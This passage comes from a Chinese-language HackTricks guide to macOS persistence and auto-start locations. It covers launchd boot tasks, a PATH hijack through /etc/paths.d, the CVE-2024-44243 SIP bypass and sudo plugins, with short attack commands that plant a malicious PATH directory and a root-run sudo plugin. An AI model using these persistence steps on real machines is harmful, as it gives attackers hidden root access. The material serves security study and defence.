Writeup：[https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 位置

- **`/Library/Preferences/Xsan/.xsanrc`**
  - 需要 root 权限
  - **触发条件**：服务运行时（很少发生）

#### 描述与利用

显然，这个脚本并不常运行，而且我在自己的 macOS 中甚至找不到它，因此如需了解更多信息，请查看 writeup。<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **此方法在现代版本的 MacOS 中不起作用**

也可以在这里放置**将在启动时执行的命令**。例如，常见的 rc.common 脚本：

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd 启动任务

Writeup：[https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- 可用于绕过 sandbox：[🔴](https://emojipedia.org/large-red-circle)（需要 root）
- 需要 root，并且根据路径不同，还需要 **SIP bypass** 或 **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access 权限

#### 位置

`launchd` 在其 **`__TEXT,__config`** section 中嵌入一个 plist，用于描述早期的“启动任务”。一些默认不存在、攻击者可以创建的参考脚本/二进制文件：

- SIP bypass 文件组：**`/Library/Apple/usr/libexec/finish_demo_restore`**、**`/private/var/install/shutdown_installer_tasks`**、**`/private/var/install/deferred_install`**
- TCC/FDA 文件组：**`/etc/rc.server`**、**`/etc/rc.cdrom`**、**`/etc/rc.netboot`**（`rc.netboot` 仅在 Sequoia+ 中预先存在）

#### 描述与利用

导出嵌入的任务表，查看 `launchd` 将运行哪些文件，以及支持哪些键（`Program`、`ProgramArguments`、`PerformAfterUserspaceReboot`、`RequireSuccess` 等）：

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

创建其中一个被引用的文件（例如 `/etc/rc.server`）会使 `launchd` 在下一次（用户空间）重启时执行它。最有用的条目受 SIP 限制，或需要 TCC SysAdminFiles/Full Disk Access，因此这是一种需要 root 权限、由重启触发的技术。<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

说明：[https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

启动任务 `rc.trampoline` 会在启动时运行存储于 `apple-trusted-trampoline` NVRAM 变量中的**平台（Apple 签名）二进制文件**，但**仅当设置了 `rc.trampoline=1` 启动参数且 SIP 已禁用时**（大小限制约为 390&nbsp;KB，并且必须满足阻塞/快速返回的约束）。由于它需要**root 权限 + 禁用 SIP + Apple 签名的 payload**，因此在实际环境中基本不适用于持久化，这里仅为完整起见而列出。<sup>[[41]](#references)</sup>

### /etc/paths 和 /etc/paths.d (PATH hijack)

- 有助于绕过沙箱：[🔴](https://emojipedia.org/large-red-circle)（写入需要 root 权限）
- 需要 root 权限

#### 位置

- **`/etc/paths`** 和 **`/etc/paths.d/*`** — 由 **`path_helper`** 读取（从 `/etc/zprofile` 调用），用于在登录时构建默认 `PATH`。

#### 描述与利用

这两个文件都归 root 所有。通过编辑 `/etc/paths` 或在 `/etc/paths.d/` 中放入文件，将攻击者控制的目录置于前面，可使该目录在每个新登录 shell 的 `PATH` 中排在靠前的位置；这样一来，名为常见命令（`ls`、`git` 等）的恶意二进制文件就会**遮蔽**真实命令，并在受害者下次调用该命令时运行。

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP 绕过（CVE-2024-44243）

文章：[https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- 可用于绕过 sandbox：[🔴](https://emojipedia.org/large-red-circle)（需要 root）
- 需要 root；效果是**绕过 SIP**。受影响的 macOS 版本为 **15.0–15.1**，已在 **15.2** 中修复

#### 位置

- 将 filesystem bundle 放入 **`/Library/Filesystems/`**。

#### 描述与利用

`storagekitd` 持有 entitlement **`com.apple.rootless.install.heritable`**，并会以**继承**该 SIP 绕过能力的方式启动 filesystem bundle 中的二进制文件。攻击者通过植入恶意 filesystem bundle，可以在绕过 SIP 的情况下运行代码，以安装**持久化 kernel extensions**，或写入受 SIP 保护的 `LaunchDaemon` 目录——这类持久化机制能够存续并突破常规保护措施。<sup>[[46]](#references)</sup> Apple 已在 macOS Sequoia 15.2 中修复此问题。

### sudo plugins（/etc/sudo.conf）

文章：[编写 Sudo Plugins（sigma-star）](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- 可用于绕过 sandbox：[🔴](https://emojipedia.org/large-red-circle)（需要 root 才能写入 `/etc/sudo.conf`）
- 安装需要 root；之后，plugin 会在**每次调用 `sudo` 时**运行（setuid-root 上下文）

#### 位置

- **`/etc/sudo.conf`** — `Plugin` 行会从 **`/usr/libexec/sudo/`**（或绝对路径）加载 shared objects。默认情况下该文件不存在（sudo 使用内置 policy），因此创建它即可设置一个干净的 hook。

#### 描述与利用

`sudo` 会从 `/etc/sudo.conf` 加载其 policy/approval/audit plugins。由于 `sudo` 是 setuid-root，恶意 shared-object plugin 会在**每次任意用户运行 `sudo` 时以 root 权限**执行——这能提供持久的 root 权限持久化，并监视每条 sudo 命令。<sup>[[51]](#references)</sup> macOS 随附的 sudo 1.9.x 支持 plugin API。

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL 插件

分析文章：[https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
最小示例：[https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Legacy 机制：**自 macOS 12.3 起已弃用。macOS 14.1 及更高版本默认禁用 legacy 视频插件。必须先从 Recovery 恢复 legacy 视频支持，此路径才能生效；仅有可写目录并不足够。[Apple 当前支持指南](https://support.apple.com/en-us/108387)。
- 写入插件目录需要 root 权限。代码执行取决于是否有兼容的客户端仍会加载 DAL 插件；此机制未经 macOS 26 实际运行测试。

#### 位置

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - 需要 root 权限
  - **触发条件：**恢复 legacy 支持后，兼容的摄像头客户端枚举设备。客户端的 library validation 可能会阻止第三方插件。

#### 描述与利用

CoreMediaIO **DAL**（Device Abstraction Layer）插件曾由部分摄像头应用在进程内加载。Apple 的[摄像头扩展演示](https://developer.apple.com/videos/play/wwdc2022/10022/)明确指出，legacy DAL 插件**不能**用于 FaceTime、QuickTime Player 或 Photo Booth，且许多其他客户端会强制执行 library validation。现代 [Core Media I/O 扩展](https://developer.apple.com/documentation/coremediaio)在进程外运行，并采用单独的安装和审批机制。历史上的进程内技术并不意味着当前 macOS 存在通用的 Camera TCC 绕过方式。<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26 上的只读观察：`/Library/CoreMediaIO/Plug-Ins/DAL` 存在且归 root 所有。未验证 legacy 支持是否启用，也未验证任何客户端是否会加载插件。

### Directory Service 插件

分析文章：[https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Legacy 条件性机制：**安装需要 root 权限，且插件必须实际配置并加载。DirectoryService 的插件 API 已弃用；应先检查目标 Mac 的 Open Directory 配置，再将其视为启动触发点。

#### 位置

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - 需要 root 权限
  - **触发条件：**Open Directory 需要时，`dspluginhelperd` 会加载符合条件且已配置的插件。[Apple 的插件运行时指南](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html)指出，未配置为启动时加载的插件，可能会在打开其节点时延迟加载。

#### 描述与利用

`dspluginhelperd` 支持 legacy DirectoryService 插件包。如果 legacy 插件被接受并激活，恶意插件就可能成为特权执行路径；这与 PAM 和 Authorization Plugins 不同。目录存在并不能证明新写入的插件会在下次启动时运行。macOS 26.5 上 Apple 的本地 `dspluginhelperd(8)` 和 `opendirectoryd(8)` 手册仍列出了该 helper 和这条 legacy 路径。<sup>[[53]](#references)</sup>

macOS 26 上的只读观察：`/Library/DirectoryServices/PlugIns` 和 `/usr/libexec/dspluginhelperd` 均存在。本次测试未安装、配置或加载任何插件。

## 持久化技术与工具

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025：Infostealer 之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [超越老旧的 LaunchAgents - 1 - shell 启动文件](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [超越老旧的 LaunchAgents - 18 - X11 和 XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [超越老旧的 LaunchAgents - 21 - 重新打开的应用程序](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [超越老旧的 LaunchAgents - 20 - Terminal 偏好设置](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [超越老旧的 LaunchAgents - 13 - Audio 插件](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit 插件 (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [超越老旧的 LaunchAgents - 12 - QuickLook 插件](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [超越老旧的 LaunchAgents - 22 - LoginHook 和 LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [超越老旧的 LaunchAgents - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [超越老旧的 LaunchAgents - 2 - iTerm2 启动](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [超越老旧的 LaunchAgents - 7 - xbar 插件](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [超越老旧的 LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [超越老旧的 LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [超越老旧的 LaunchAgents - 3 - 登录项](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [超越老旧的 LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [超越老旧的 LaunchAgents - 24 - 文件夹操作](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [在 macOS 上使用文件夹操作实现持久化 (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [超越老旧的 LaunchAgents - 27 - Dock 快捷方式](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [超越老旧的 LaunchAgents - 17 - 取色器](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [超越老旧的 LaunchAgents - 26 - Finder Sync 插件](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [分析“Mac File Opener”持久化机制 (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [超越老旧的 LaunchAgents - 16 - 屏幕保护程序](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [守住访问权限：使用屏幕保护程序在 macOS 上实现持久化 (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [超越老旧的 LaunchAgents - 11 - Spotlight 导入器](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [超越老旧的 LaunchAgents - 9 - 偏好设置面板](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [超越老旧的 LaunchAgents - 19 - 定期脚本](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [超越老旧的 LaunchAgents - 5 - 可插拔认证模块 (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [超越老旧的 LaunchAgents - 28 - Authorization 插件](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [使用 Authorization 插件持续窃取凭据 (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [超越老旧的 LaunchAgents - 30 - man 配置文件 - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [超越老旧的 LaunchAgents - 25 - Apache2 模块](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [超越老旧的 LaunchAgents - 31 - BSM 审计框架](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [超越老旧的 LaunchAgents - 23 - emond：事件监控守护进程](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [超越老旧的 LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [超越老旧的 LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [超越老旧的 LaunchAgents - 10 - 应用程序脚本文件](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [超越老旧的 LaunchAgents - 32 - Dock Tile 插件](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [超越老旧的 LaunchAgents - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [超越老旧的 LaunchAgents - 34 - launchd 启动任务](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [超越老旧的 LaunchAgents - 35 - 通过 NVRAM 持久化 (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [在 OS X 上使用电子邮件实现持久化 (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [可疑的 Apple Mail 规则 Plist 修改 (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [恶意配置描述文件——Mac 最严重的威胁之一 (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [《Mac 恶意软件的艺术》第 1 卷 - 第 0x2 章：持久化 (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [分析 CVE-2024-44243：通过内核扩展绕过 macOS SIP (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [通过 Claude Code 项目文件实现 RCE 和 API Token 外泄 (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot 和 Cursor 中的新漏洞——Rules 文件后门 (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - 替代安装方式 (外部扩展)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [在 Mac 上移除 Chrome 的 ExtensionInstallForcelist (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [编写 Sudo 插件 (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [通过自定义 URL Scheme 远程利用 Mac (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [滥用插件实现 macOS 持久化的两种技巧 (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL 最小示例 (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight：分析基于 Spotlight 的 macOS TCC 漏洞 (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` 模块文档 (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [从 Spotlight 到 Apple Intelligence——滥用一个 0day 窃取为 macOS AI 提供数据的信息](https://objective-see.org/blog/blog_0x81.html)
- [58] [PEP 829 — 包启动配置文件](https://peps.python.org/pep-0829/)
- [59] [Python 3.15 `site` 文档——启动入口](https://docs.python.org/3.15/library/site.html)
- [60] [autorun-audit — PEP 829 和 `.start` 文件](https://github.com/ag3ntsc4rn/autorun-audit)
{{#include ../banners/hacktricks-training.md}}
